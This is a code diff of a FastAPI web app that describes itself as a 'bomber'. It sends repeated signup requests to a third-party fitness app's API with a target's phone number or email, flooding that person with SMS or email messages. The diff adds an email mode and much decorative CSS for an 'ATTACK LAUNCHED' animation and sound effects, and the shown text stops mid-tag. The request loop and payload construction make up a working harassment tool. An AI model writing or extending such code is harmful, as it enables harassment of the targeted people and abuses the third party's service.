@@ -1,4 +1,4 @@
-from fastapi import FastAPI, Request, Form
+from fastapi import FastAPI, Request
 from fastapi.responses import HTMLResponse
 import asyncio
 import aiohttp
@@ -19,6 +19,7 @@ class BombRequest(BaseModel):
     count: int
     delay: float
     method: str
+    email: Optional[str] = ""
 
 # === COMPLETE API LIST ===
 ULTIMATE_APIS = [
@@ -61,6 +62,7 @@ bomb_status = {
     "failed": 0,
     "progress": 0,
     "method": None,
+    "email": None,
     "logs": []
 }
 
@@ -130,22 +132,35 @@ async def run_attack(phone, duration=None):
     attack_status["running"] = False
 
 # === BOMBER FUNCTION ===
-async def send_bomb_request(session, method, target):
+async def send_bomb_request(session, method, target, email=""):
     API_URL = "https://prod.fitflexapp.com/api/users/signupV1"
-    payload = {
-        "type": "msisdn" if method == "phone" else "email",
-        "user_platform": "Android",
-        "country_id": "162",
-        "msisdn": target if method == "phone" else "",
-        "email": target if method == "email" else ""
-    }
+    
+    # For email method, use email as target
+    if method == "email":
+        payload = {
+            "type": "email",
+            "user_platform": "Android",
+            "country_id": "162",
+            "msisdn": "",
+            "email": target
+        }
+    else:
+        # Phone/SMS method
+        payload = {
+            "type": "msisdn",
+            "user_platform": "Android",
+            "country_id": "162",
+            "msisdn": target,
+            "email": ""
+        }
+    
     try:
         async with session.post(API_URL, json=payload, timeout=10) as resp:
             return resp.status == 200
     except:
         return False
 
-async def run_bomber(target, count, delay, method):
+async def run_bomber(target, count, delay, method, email=""):
     global bomb_status
     bomb_status["running"] = True
     bomb_status["target"] = target
@@ -154,14 +169,17 @@ async def run_bomber(target, count, delay, method):
     bomb_status["failed"] = 0
     bomb_status["progress"] = 0
     bomb_status["method"] = method
-    add_bomb_log(f"🚀 Bombing started on {target} ({method})")
+    bomb_status["email"] = email if method == "email" else None
+    
+    method_name = "Email" if method == "email" else "SMS"
+    add_bomb_log(f"🚀 Bombing started on {target} ({method_name})")
     add_bomb_log(f"📊 Total: {count}, Delay: {delay}s")
 
     async with aiohttp.ClientSession() as session:
         for i in range(count):
             if not bomb_status["running"]:
                 break
-            ok = await send_bomb_request(session, method, target)
+            ok = await send_bomb_request(session, method, target, email)
             if ok:
                 bomb_status["success"] += 1
             else:
@@ -496,6 +514,38 @@ async def index():
         .tab-content.active {
             display: block;
         }
+        
+        /* Bold Column Headers */
+        .col-header {
+            font-weight: 800;
+            font-size: 0.75rem;
+            text-transform: uppercase;
+            letter-spacing: 0.08em;
+            padding: 0.5rem 0;
+            border-bottom: 2px solid rgba(59, 130, 246, 0.2);
+        }
+        .col-header-blue {
+            color: #60a5fa;
+            text-shadow: 0 0 20px rgba(59, 130, 246, 0.2);
+        }
+        .col-header-green {
+            color: #34d399;
+            text-shadow: 0 0 20px rgba(16, 185, 129, 0.2);
+        }
+        .col-header-gold {
+            color: #fbbf24;
+            text-shadow: 0 0 20px rgba(251, 191, 36, 0.2);
+        }
+        .col-header-purple {
+            color: #a78bfa;
+            text-shadow: 0 0 20px rgba(167, 139, 250, 0.2);
+        }
+        .col-header-red {
+            color: #f87171;
+            text-shadow: 0 0 20px rgba(248, 113, 113, 0.2);
+        }
+        
+        /* Enhanced Heart Animation */
         .heart-overlay {
             position: fixed;
             top: 0;
@@ -507,29 +557,31 @@ async def index():
             display: none;
             justify-content: center;
             align-items: center;
-            background: rgba(0,0,0,0.4);
-            backdrop-filter: blur(8px);
+            background: rgba(0,0,0,0.5);
+            backdrop-filter: blur(10px);
         }
         .heart-overlay.active {
             display: flex;
-            animation: heartFade 3s ease-out forwards;
+            animation: heartFade 3.5s ease-out forwards;
         }
         @keyframes heartFade {
-            0% { opacity: 1; backdrop-filter: blur(12px); }
-            70% { opacity: 1; backdrop-filter: blur(12px); }
+            0% { opacity: 1; backdrop-filter: blur(20px); }
+            60% { opacity: 1; backdrop-filter: blur(20px); }
             100% { opacity: 0; backdrop-filter: blur(0); }
         }
         .heart-container {
             position: relative;
-            width: 280px;
-            height: 280px;
-            animation: heartPulse 0.5s ease-in-out 6;
+            width: 350px;
+            height: 350px;
+            animation: heartMainPulse 0.5s ease-in-out 7;
         }
-        @keyframes heartPulse {
-            0%, 100% { transform: scale(1); }
-            25% { transform: scale(1.2); }
-            50% { transform: scale(1); }
-            75% { transform: scale(1.1); }
+        @keyframes heartMainPulse {
+            0%, 100% { transform: scale(1) rotate(0deg); }
+            15% { transform: scale(1.15) rotate(-5deg); }
+            30% { transform: scale(0.95) rotate(5deg); }
+            45% { transform: scale(1.1) rotate(-3deg); }
+            60% { transform: scale(1) rotate(3deg); }
+            75% { transform: scale(1.05) rotate(-2deg); }
         }
         .heart-text {
             position: absolute;
@@ -537,13 +589,21 @@ async def index():
             left: 50%;
             transform: translate(-50%, -50%);
             font-family: 'Inter', sans-serif;
-            font-weight: 800;
-            font-size: 2.5rem;
+            font-weight: 900;
+            font-size: 2.8rem;
             color: #fbbf24;
-            text-shadow: 0 0 40px rgba(251,191,36,0.5), 0 0 80px rgba(251,191,36,0.2);
-            z-index: 1;
+            text-shadow: 
+                0 0 30px rgba(251,191,36,0.8),
+                0 0 60px rgba(251,191,36,0.5),
+                0 0 100px rgba(251,191,36,0.3);
+            z-index: 2;
             text-align: center;
             line-height: 1.2;
+            animation: textFloat 1.5s ease-in-out infinite alternate;
+        }
+        @keyframes textFloat {
+            0% { transform: translate(-50%, -50%) scale(1); }
+            100% { transform: translate(-50%, -55%) scale(1.05); }
         }
         .heart-svg {
             position: absolute;
@@ -551,17 +611,65 @@ async def index():
             left: 0;
             width: 100%;
             height: 100%;
-            filter: drop-shadow(0 0 40px rgba(239,68,68,0.4));
-            animation: heartGlow 1s ease-in-out infinite alternate;
+            filter: drop-shadow(0 0 50px rgba(239,68,68,0.6));
+            animation: heartGlowPulse 1.2s ease-in-out infinite alternate;
         }
-        @keyframes heartGlow {
-            0% { filter: drop-shadow(0 0 30px rgba(239,68,68,0.3)); }
-            100% { filter: drop-shadow(0 0 60px rgba(239,68,68,0.6)); }
+        @keyframes heartGlowPulse {
+            0% { 
+                filter: drop-shadow(0 0 30px rgba(239,68,68,0.4)) 
+                       drop-shadow(0 0 60px rgba(239,68,68,0.2));
+            }
+            100% { 
+                filter: drop-shadow(0 0 60px rgba(239,68,68,0.8)) 
+                       drop-shadow(0 0 120px rgba(239,68,68,0.4))
+                       drop-shadow(0 0 180px rgba(239,68,68,0.2));
+            }
         }
+        
+        /* Sparkles around heart */
+        .sparkle {
+            position: absolute;
+            width: 8px;
+            height: 8px;
+            background: #fbbf24;
+            border-radius: 50%;
+            box-shadow: 0 0 20px #fbbf24, 0 0 40px #fbbf24;
+            animation: sparkleAnim 1.5s ease-in-out infinite alternate;
+        }
+        @keyframes sparkleAnim {
+            0% { transform: scale(0) rotate(0deg); opacity: 0; }
+            50% { transform: scale(1.5) rotate(180deg); opacity: 1; }
+            100% { transform: scale(0) rotate(360deg); opacity: 0; }
+        }
+        
+        .sparkle:nth-child(1) { top: -20px; left: 50%; animation-delay: 0s; }
+        .sparkle:nth-child(2) { top: 20%; right: -30px; animation-delay: 0.3s; }
+        .sparkle:nth-child(3) { bottom: 20%; right: -30px; animation-delay: 0.6s; }
+        .sparkle:nth-child(4) { bottom: -20px; left: 50%; animation-delay: 0.9s; }
+        .sparkle:nth-child(5) { top: 20%; left: -30px; animation-delay: 1.2s; }
+        .sparkle:nth-child(6) { bottom: 20%; left: -30px; animation-delay: 0.4s; }
+        
+        /* Ring burst */
+        .ring-burst {
+            position: absolute;
+            top: 50%;
+            left: 50%;
+            transform: translate(-50%, -50%);
+            width: 100%;
+            height: 100%;
+            border-radius: 50%;
+            border: 2px solid rgba(251,191,36,0.3);
+            animation: ringBurst 1.5s ease-out 3;
+        }
+        @keyframes ringBurst {
+            0% { transform: translate(-50%, -50%) scale(0.5); opacity: 1; }
+            100% { transform: translate(-50%, -50%) scale(2); opacity: 0; }
+        }
+        
         @media (max-width: 768px) {
             .stat-number, .stat-number-green, .stat-number-red { font-size: 1.6rem; }
-            .heart-container { width: 200px; height: 200px; }
-            .heart-text { font-size: 1.8rem; }
+            .heart-container { width: 220px; height: 220px; }
+            .heart-text { font-size: 2rem; }
         }
     </style>
 </head>
@@ -573,18 +681,36 @@ async def index():
     <div class="orb" style="width:300px;height:300px;background:#8b5cf6;bottom:-50px;left:-50px;animation-delay:5s;"></div>
     <div class="orb" style="width:200px;height:200px;background:#06b6d4;top:50%;left:50%;transform:translate(-50%,-50%);animation-delay:8s;"></div>
 
-    <!-- Heart Overlay -->
+    <!-- Enhanced Heart Overlay -->
     <div class="heart-overlay" id="heartOverlay">
         <div class="heart-container">
+            <div class="sparkle"></div>
+            <div class="sparkle"></div>
+            <div class="sparkle"></div>
+            <div class="sparkle"></div>
+            <div class="sparkle"></div>
+            <div class="sparkle"></div>
+            <div class="ring-burst" style="animation-delay: 0s;"></div>
+            <div class="ring-burst" style="animation-delay: 0.5s;"></div>
+            <div class="ring-burst" style="animation-delay: 1s;"></div>
             <svg class="heart-svg" viewBox="0 0 100 100">
                 <defs>
                     <radialGradient id="heartGrad" cx="50%" cy="50%" r="50%">
                         <stop offset="0%" stop-color="#ef4444"/>
-                        <stop offset="100%" stop-color="#b91c1c"/>
+                        <stop offset="40%" stop-color="#dc2626"/>
+                        <stop offset="100%" stop-color="#7f1d1d"/>
                     </radialGradient>
+                    <filter id="heartGlowFilter">
+                        <feGaussianBlur stdDeviation="4" result="blur"/>
+                        <feMerge>
+                            <feMergeNode in="blur"/>
+                            <feMergeNode in="blur"/>
+                            <feMergeNode in="SourceGraphic"/>
+                        </feMerge>
+                    </filter>
                 </defs>
                 <path d="M50 88 C20 65 0 50 0 35 C0 15 15 0 35 0 C45 0 50 8 50 8 C50 8 55 0 65 0 C85 0 100 15 100 35 C100 50 80 65 50 88Z"
-                      fill="url(#heartGrad)" opacity="0.9"/>
+                      fill="url(#heartGrad)" filter="url(#heartGlowFilter)" opacity="0.95"/>
             </svg>
             <div class="heart-text">⚡ ATTACK<br>LAUNCHED</div>
         </div>
@@ -592,15 +718,15 @@ async def index():
 
     <!-- Audio -->
     <audio id="wrongSound" preload="auto">
-        <source src="data:audio/wav;base64,UklGRnoGAABXQVZFZm10IBAAAAABAAEAQB8AAEAfAAABAAgAZGF0YQoGAACBhYqFh4qAgICAf4mMjo6LgH6Af3t/gHp3doR/gXx2e3Z1c2dxc3NwZWNfXmNcU1hVU1dWU1BQUU1MSkVGRkpHSEZGQ0dDQkI+OjUyMy4rKScnJiMiHRsWGRIPDAkGBwMCAQABAgIDAwMCAgEBAQEBAQEBAgIDAgIDAgIDAwMDAwMEBAQEBQUFBQUGBgYGBwcHCAgJCQkJCwsLCwsLCwwMDA0NDQ4ODg8PDw8PDw8PDw8PDw8PDw8QDw8PDw4ODg0NDQwMDAwLCwsKCgoICQgHBwYGBgUEBAMDAwICAQEBAQEBAQEBAQECAgIDAwMDAwQEBAUFBQYGBwcHCAgICQkJCgoLCwwMDA0ODQ4PDw8PDxAPEA8PDw8PDw8PDw8OEA8PDw4ODg4ODQ0NDQwMDAwLCwsLCgoKCQkJCQgHBwYGBgUFBAMDAwMCAgIBAQEBAQECAgIDAwMDAwQEBAUFBQYGBwcHCAgICQkJCgoLCwwMDA0ODQ4PDw8PDw8QDw8PDw8PDw8PDw4ODg4ODQ0NDQwMDAwLCwsLCgoJCQkICAcHBwYGBQUEBAMDAwMCAgEBAQEBAQECAgIDAwMDAwQEBAUFBQUGBwcHCAgICQkJCgoLCwsLDAwMDQ0NDg4ODw8PEA8PDw8PDw4ODg4ODQ0NDQ0MDAwLCwsLCgoKCQkJCQgHBwcGBgUFBQQEAwMDAwICAQEBAQEBAQECAgIDAwMDAwQEBAUFBQUGBgcHCAgICQkJCgoLCwsLDAwMDQ0NDg4ODw8PDw8PDw8PDw4ODg4ODQ0NDQ0MDAwLCwsLCgoKCQkJCQgHBwcGBgUFBQQEAwMDAwICAQEBAQEBAQECAgIDAwMDAwQEBAUFBQUGBgcHCAgICQkJCgoLCwsLDAwMDQ0NDg4ODw8PDw8PDw8PDw4ODg4ODQ0NDQ0MDAwLCwsLCgoKCQkJCQgHBwcGBgUFBQQEAwMDAwICAQEBAQEBAQECAgIDAwMDAwQEBAUFBQUGBgcHCAgICQkJCgoLCwsLDAwMDQ0NDg4ODw8PDw8PDw8PDw4ODg4ODQ0NDQ0MDAwLCwsLCgoKCQkJCQgHBwcGBgUFBQQEAwMDAwICAQEBAQEBAQECAgIDAwMDAwQEBAUFBQUGBgcHCAgICQkJCgoLCwsLDAwMDQ0NDg4ODw8PDw8PDw8PDw4ODg4ODQ0NDQ0MDAwLCwsLCgoKCQkJCQgHBwcGBgUFBQQEAwMDAwICAQEBAQEBAQECAgIDAwMDAwQEBAUFBQUGBgcHCAgICQkJCgoLCwsLDAwMDQ0NDg4ODw8PDw8PDw8PDw4ODg4ODQ0NDQ0MDAwLCwsLCgoKCQkJCQgHBwcGBgUFBQQEAwMDAwICAQEBAQEBAQECAgIDAwMDAwQEBAUFBQUGBgcHCAgICQkJCgoLCwsLDAwMDQ0NDg4ODw8PDw8PDw8PDw4ODg4ODQ0NDQ0MDAwLCwsLCgoKCQkJCQgHBwcGBgUFBQQEAwMDAwICAQEBAQEBAQECAgIDAwMDAwQEBAUFBQUGBgcHCAgICQkJCgoLCwsLDAwMDQ0NDg4ODw8PDw8PDw8PDw4ODg4ODQ0NDQ0MDAwLCwsLCgoKCQkJCQgHBwcGBgUFBQQEAwMDAwICAQEBAQEBAQECAgIDAwMDAwQEBAUFBQUGBgcHCAgICQkJCgoLCwsLDAwMDQ0NDg4ODw8PDw8PDw8PDw4ODg4ODQ0NDQ0MDAwLCwsLCgoKCQkJCQgHBwcGBgUFBQQEAwMDAwICAQEBAQEBAQECAgIDAwMDAwQEBAUFBQUGBgcHCAgICQkJCgoLCwsLDAwMDQ0NDg4ODw8PDw8PDw8PDw4ODg4ODQ0NDQ0MDAwLCwsLCgoKCQkJCQgHBwcGBgUFBQQEAwMDAwICAQEBAQEBAQECAgIDAwMDAwQEBAUFBQUGBgcHCAgICQkJCgoLCwsLDAwMDQ0NDg4ODw8PDw8PDw8PDw4ODg4ODQ0NDQ0MDAwLCwsLCgoKCQkJCQgHBwcGBgUFBQQEAwMDAwICAQEBAQEBAQECAgIDAwMDAwQEBAUFBQUGBgcHCAgICQkJCgoLCwsLDAwMDQ0NDg4ODw8PDw8PDw8PDw4ODg4ODQ0NDQ0MDAwLCwsLCgoKCQkJCQgHBwcGBgUFBQQEAwMDAwICAQEBAA==">
+        <source src="data:audio/wav;base64,UklGRnoGAABXQVZFZm10IBAAAAABAAEAQB8AAEAfAAABAAgAZGF0YQoGAACBhYqFh4qAgICAf4mMjo6LgH6Af3t/gHp3doR/gXx2e3Z1c2dxc3NwZWNfXmNcU1hVU1dWU1BQUU1MSkVGRkpHSEZGQ0dDQkI+OjUyMy4rKScnJiMiHRsWGRIPDAkGBwMCAQABAgIDAwMCAgEBAQEBAQEBAgIDAgIDAgIDAwMDAwMEBAQEBQUFBQUGBgYGBwcHCAgJCQkJCwsLCwsLCwwMDA0NDQ4ODg8PDw8PDw8PDw8PDw8PDw8QDw8PDw4ODg0NDQwMDAwLCwsKCgoICQgHBwYGBgUEBAMDAwICAQEBAQEBAQEBAQECAgIDAwMDAwQEBAUFBQYGBwcHCAgICQkJCgoLCwwMDA0ODQ4PDw8PDxAPEA8PDw8PDw8PDw8OEA8PDw4ODg4ODQ0NDQwMDAwLCwsLCgoKCQkJCQgHBwYGBgUFBAMDAwMCAgIBAQEBAQECAgIDAwMDAwQEBAUFBQYGBwcHCAgICQkJCgoLCwwMDA0ODQ4PDw8PDw8QDw8PDw8PDw8PDw4ODg4ODQ0NDQwMDAwLCwsLCgoJCQkICAcHBwYGBQUEBAMDAwMCAgEBAQEBAQECAgIDAwMDAwQEBAUFBQUGBwcHCAgICQkJCgoLCwsLDAwMDQ0NDg4ODw8PEA8PDw8PDw4ODg4ODQ0NDQ0MDAwLCwsLCgoKCQkJCQgHBwcGBgUFBQQEAwMDAwICAQEBAQEBAQECAgIDAwMDAwQEBAUFBQUGBgcHCAgICQkJCgoLCwsLDAwMDQ0NDg4ODw8PDw8PDw8PDw4ODg4ODQ0NDQ0MDAwLCwsLCgoKCQkJCQgHBwcGBgUFBQQEAwMDAwICAQEBAQEBAQECAgIDAwMDAwQEBAUFBQUGBgcHCAgICQkJCgoLCwsLDAwMDQ0NDg4ODw8PDw8PDw8PDw4ODg4ODQ0NDQ0MDAwLCwsLCgoKCQkJCQgHBwcGBgUFBQQEAwMDAwICAQEBAQEBAQECAgIDAwMDAwQEBAUFBQUGBgcHCAgICQkJCgoLCwsLDAwMDQ0NDg4ODw8PDw8PDw8PDw4ODg4ODQ0NDQ0MDAwLCwsLCgoKCQkJCQgHBwcGBgUFBQQEAwMDAwICAQEBAQEBAQECAgIDAwMDAwQEBAUFBQUGBgcHCAgICQkJCgoLCwsLDAwMDQ0NDg4ODw8PDw8PDw8PDw4ODg4ODQ0NDQ0MDAwLCwsLCgoKCQkJCQgHBwcGBgUFBQQEAwMDAwICAQEBAQEBAQECAgIDAwMDAwQEBAUFBQUGBgcHCAgICQkJCgoLCwsLDAwMDQ0NDg4ODw8PDw8PDw8PDw4ODg4ODQ0NDQ0MDAwLCwsLCgoKCQkJCQgHBwcGBgUFBQQEAwMDAwICAQEBAQEBAQECAgIDAwMDAwQEBAUFBQUGBgcHCAgICQkJCgoLCwsLDAwMDQ0NDg4ODw8PDw8PDw8PDw4ODg4ODQ0NDQ0MDAwLCwsLCgoKCQkJCQgHBwcGBgUFBQQEAwMDAwICAQEBAQEBAQECAgIDAwMDAwQEBAUFBQUGBgcHCAgICQkJCgoLCwsLDAwMDQ0NDg4ODw8PDw8PDw8PDw4ODg4ODQ0NDQ0MDAwLCwsLCgoKCQkJCQgHBwcGBgUFBQQEAwMDAwICAQEBAQEBAQECAgIDAwMDAwQEBAUFBQUGBgcHCAgICQkJCgoLCwsLDAwMDQ0NDg4ODw8PDw8PDw8PDw4ODg4ODQ0NDQ0MDAwLCwsLCgoKCQkJCQgHBwcGBgUFBQQEAwMDAwICAQEBAQEBAQECAgIDAwMDAwQEBAUFBQUGBgcHCAgICQkJCgoLCwsLDAwMDQ0NDg4ODw8PDw8PDw8PDw4ODg4ODQ0NDQ0MDAwLCwsLCgoKCQkJCQgHBwcGBgUFBQQEAwMDAwICAQEBAQEBAQECAgIDAwMDAwQEBAUFBQUGBgcHCAgICQkJCgoLCwsLDAwMDQ0NDg4ODw8PDw8PDw8PDw4ODg4ODQ0NDQ0MDAwLCwsLCgoKCQkJCQgHBwcGBgUFBQQEAwMDAwICAQEBAQEBAQECAgIDAwMDAwQEBAUFBQUGBgcHCAgICQkJCgoLCwsLDAwMDQ0NDg4ODw8PDw8PDw8PDw4ODg4ODQ0NDQ0MDAwLCwsLCgoKCQkJCQgHBwcGBgUFBQQEAwMDAwICAQEBAQEBAQECAgIDAwMDAwQEBAUFBQUGBgcHCAgICQkJCgoLCwsLDAwMDQ0NDg4ODw8PDw8PDw8PDw4ODg4ODQ0NDQ0MDAwLCwsLCgoKCQkJCQgHBwcGBgUFBQQEAwMDAwICAQEBAA==">
         </source>
     </audio>
     <audio id="attackSound" preload="auto">
-        <source src="data:audio/wav;base64,UklGRnoGAABXQVZFZm10IBAAAAABAAEAQB8AAEAfAAABAAgAZGF0YQoGAACBhYqFh4qAgICAf4mMjo6LgH6Af3t/gHp3doR/gXx2e3Z1c2dxc3NwZWNfXmNcU1hVU1dWU1BQUU1MSkVGRkpHSEZGQ0dDQkI+OjUyMy4rKScnJiMiHRsWGRIPDAkGBwMCAQABAgIDAwMCAgEBAQEBAQEBAgIDAgIDAgIDAwMDAwMEBAQEBQUFBQUGBgYGBwcHCAgJCQkJCwsLCwsLCwwMDA0NDQ4ODg8PDw8PDw8PDw8PDw8PDw8QDw8PDw4ODg0NDQwMDAwLCwsKCgoICQgHBwYGBgUEBAMDAwICAQEBAQEBAQEBAQECAgIDAwMDAwQEBAUFBQYGBwcHCAgICQkJCgoLCwwMDA0ODQ4PDw8PDxAPEA8PDw8PDw8PDw8OEA8PDw4ODg4ODQ0NDQwMDAwLCwsLCgoKCQkJCQgHBwYGBgUFBAMDAwMCAgIBAQEBAQECAgIDAwMDAwQEBAUFBQYGBwcHCAgICQkJCgoLCwwMDA0ODQ4PDw8PDw8QDw8PDw8PDw8PDw4ODg4ODQ0NDQwMDAwLCwsLCgoJCQkICAcHBwYGBQUEBAMDAwMCAgEBAQEBAQECAgIDAwMDAwQEBAUFBQUGBwcHCAgICQkJCgoLCwsLDAwMDQ0NDg4ODw8PEA8PDw8PDw4ODg4ODQ0NDQ0MDAwLCwsLCgoKCQkJCQgHBwcGBgUFBQQEAwMDAwICAQEBAQEBAQECAgIDAwMDAwQEBAUFBQUGBgcHCAgICQkJCgoLCwsLDAwMDQ0NDg4ODw8PDw8PDw8PDw4ODg4ODQ0NDQ0MDAwLCwsLCgoKCQkJCQgHBwcGBgUFBQQEAwMDAwICAQEBAQEBAQECAgIDAwMDAwQEBAUFBQUGBgcHCAgICQkJCgoLCwsLDAwMDQ0NDg4ODw8PDw8PDw8PDw4ODg4ODQ0NDQ0MDAwLCwsLCgoKCQkJCQgHBwcGBgUFBQQEAwMDAwICAQEBAQEBAQECAgIDAwMDAwQEBAUFBQUGBgcHCAgICQkJCgoLCwsLDAwMDQ0NDg4ODw8PDw8PDw8PDw4ODg4ODQ0NDQ0MDAwLCwsLCgoKCQkJCQgHBwcGBgUFBQQEAwMDAwICAQEBAQEBAQECAgIDAwMDAwQEBAUFBQUGBgcHCAgICQkJCgoLCwsLDAwMDQ0NDg4ODw8PDw8PDw8PDw4ODg4ODQ0NDQ0MDAwLCwsLCgoKCQkJCQgHBwcGBgUFBQQEAwMDAwICAQEBAQEBAQECAgIDAwMDAwQEBAUFBQUGBgcHCAgICQkJCgoLCwsLDAwMDQ0NDg4ODw8PDw8PDw8PDw4ODg4ODQ0NDQ0MDAwLCwsLCgoKCQkJCQgHBwcGBgUFBQQEAwMDAwICAQEBAQEBAQECAgIDAwMDAwQEBAUFBQUGBgcHCAgICQkJCgoLCwsLDAwMDQ0NDg4ODw8PDw8PDw8PDw4ODg4ODQ0NDQ0MDAwLCwsLCgoKCQkJCQgHBwcGBgUFBQQEAwMDAwICAQEBAQEBAQECAgIDAwMDAwQEBAUFBQUGBgcHCAgICQkJCgoLCwsLDAwMDQ0NDg4ODw8PDw8PDw8PDw4ODg4ODQ0NDQ0MDAwLCwsLCgoKCQkJCQgHBwcGBgUFBQQEAwMDAwICAQEBAQEBAQECAgIDAwMDAwQEBAUFBQUGBgcHCAgICQkJCgoLCwsLDAwMDQ0NDg4ODw8PDw8PDw8PDw4ODg4ODQ0NDQ0MDAwLCwsLCgoKCQkJCQgHBwcGBgUFBQQEAwMDAwICAQEBAQEBAQECAgIDAwMDAwQEBAUFBQUGBgcHCAgICQkJCgoLCwsLDAwMDQ0NDg4ODw8PDw8PDw8PDw4ODg4ODQ0NDQ0MDAwLCwsLCgoKCQkJCQgHBwcGBgUFBQQEAwMDAwICAQEBAQEBAQECAgIDAwMDAwQEBAUFBQUGBgcHCAgICQkJCgoLCwsLDAwMDQ0NDg4ODw8PDw8PDw8PDw4ODg4ODQ0NDQ0MDAwLCwsLCgoKCQkJCQgHBwcGBgUFBQQEAwMDAwICAQEBAQEBAQECAgIDAwMDAwQEBAUFBQUGBgcHCAgICQkJCgoLCwsLDAwMDQ0NDg4ODw8PDw8PDw8PDw4ODg4ODQ0NDQ0MDAwLCwsLCgoKCQkJCQgHBwcGBgUFBQQEAwMDAwICAQEBAA==">
+        <source src="data:audio/wav;base64,UklGRnoGAABXQVZFZm10IBAAAAABAAEAQB8AAEAfAAABAAgAZGF0YQoGAACBhYqFh4qAgICAf4mMjo6LgH6Af3t/gHp3doR/gXx2e3Z1c2dxc3NwZWNfXmNcU1hVU1dWU1BQUU1MSkVGRkpHSEZGQ0dDQkI+OjUyMy4rKScnJiMiHRsWGRIPDAkGBwMCAQABAgIDAwMCAgEBAQEBAQEBAgIDAgIDAgIDAwMDAwMEBAQEBQUFBQUGBgYGBwcHCAgJCQkJCwsLCwsLCwwMDA0NDQ4ODg8PDw8PDw8PDw8PDw8PDw8QDw8PDw4ODg0NDQwMDAwLCwsKCgoICQgHBwYGBgUEBAMDAwICAQEBAQEBAQEBAQECAgIDAwMDAwQEBAUFBQYGBwcHCAgICQkJCgoLCwwMDA0ODQ4PDw8PDxAPEA8PDw8PDw8PDw8OEA8PDw4ODg4ODQ0NDQwMDAwLCwsLCgoKCQkJCQgHBwYGBgUFBAMDAwMCAgIBAQEBAQECAgIDAwMDAwQEBAUFBQYGBwcHCAgICQkJCgoLCwwMDA0ODQ4PDw8PDw8QDw8PDw8PDw8PDw4ODg4ODQ0NDQwMDAwLCwsLCgoJCQkICAcHBwYGBQUEBAMDAwMCAgEBAQEBAQECAgIDAwMDAwQEBAUFBQUGBwcHCAgICQkJCgoLCwsLDAwMDQ0NDg4ODw8PEA8PDw8PDw4ODg4ODQ0NDQ0MDAwLCwsLCgoKCQkJCQgHBwcGBgUFBQQEAwMDAwICAQEBAQEBAQECAgIDAwMDAwQEBAUFBQUGBgcHCAgICQkJCgoLCwsLDAwMDQ0NDg4ODw8PDw8PDw8PDw4ODg4ODQ0NDQ0MDAwLCwsLCgoKCQkJCQgHBwcGBgUFBQQEAwMDAwICAQEBAQEBAQECAgIDAwMDAwQEBAUFBQUGBgcHCAgICQkJCgoLCwsLDAwMDQ0NDg4ODw8PDw8PDw8PDw4ODg4ODQ0NDQ0MDAwLCwsLCgoKCQkJCQgHBwcGBgUFBQQEAwMDAwICAQEBAQEBAQECAgIDAwMDAwQEBAUFBQUGBgcHCAgICQkJCgoLCwsLDAwMDQ0NDg4ODw8PDw8PDw8PDw4ODg4ODQ0NDQ0MDAwLCwsLCgoKCQkJCQgHBwcGBgUFBQQEAwMDAwICAQEBAQEBAQECAgIDAwMDAwQEBAUFBQUGBgcHCAgICQkJCgoLCwsLDAwMDQ0NDg4ODw8PDw8PDw8PDw4ODg4ODQ0NDQ0MDAwLCwsLCgoKCQkJCQgHBwcGBgUFBQQEAwMDAwICAQEBAQEBAQECAgIDAwMDAwQEBAUFBQUGBgcHCAgICQkJCgoLCwsLDAwMDQ0NDg4ODw8PDw8PDw8PDw4ODg4ODQ0NDQ0MDAwLCwsLCgoKCQkJCQgHBwcGBgUFBQQEAwMDAwICAQEBAQEBAQECAgIDAwMDAwQEBAUFBQUGBgcHCAgICQkJCgoLCwsLDAwMDQ0NDg4ODw8PDw8PDw8PDw4ODg4ODQ0NDQ0MDAwLCwsLCgoKCQkJCQgHBwcGBgUFBQQEAwMDAwICAQEBAQEBAQECAgIDAwMDAwQEBAUFBQUGBgcHCAgICQkJCgoLCwsLDAwMDQ0NDg4ODw8PDw8PDw8PDw4ODg4ODQ0NDQ0MDAwLCwsLCgoKCQkJCQgHBwcGBgUFBQQEAwMDAwICAQEBAQEBAQECAgIDAwMDAwQEBAUFBQUGBgcHCAgICQkJCgoLCwsLDAwMDQ0NDg4ODw8PDw8PDw8PDw4ODg4ODQ0NDQ0MDAwLCwsLCgoKCQkJCQgHBwcGBgUFBQQEAwMDAwICAQEBAQEBAQECAgIDAwMDAwQEBAUFBQUGBgcHCAgICQkJCgoLCwsLDAwMDQ0NDg4ODw8PDw8PDw8PDw4ODg4ODQ0NDQ0MDAwLCwsLCgoKCQkJCQgHBwcGBgUFBQQEAwMDAwICAQEBAQEBAQECAgIDAwMDAwQEBAUFBQUGBgcHCAgICQkJCgoLCwsLDAwMDQ0NDg4ODw8PDw8PDw8PDw4ODg4ODQ0NDQ0MDAwLCwsLCgoKCQkJCQgHBwcGBgUFBQQEAwMDAwICAQEBAQEBAQECAgIDAwMDAwQEBAUFBQUGBgcHCAgICQkJCgoLCwsLDAwMDQ0NDg4ODw8PDw8PDw8PDw4ODg4ODQ0NDQ0MDAwLCwsLCgoKCQkJCQgHBwcGBgUFBQQEAwMDAwICAQEBAQEBAQECAgIDAwMDAwQEBAUFBQUGBgcHCAgICQkJCgoLCwsLDAwMDQ0NDg4ODw8PDw8PDw8PDw4ODg4ODQ0NDQ0MDAwLCwsLCgoKCQkJCQgHBwcGBgUFBQQEAwMDAwICAQEBAA==">
         </source>
     </audio>
     <audio id="niceSound" preload="auto">
-        <source 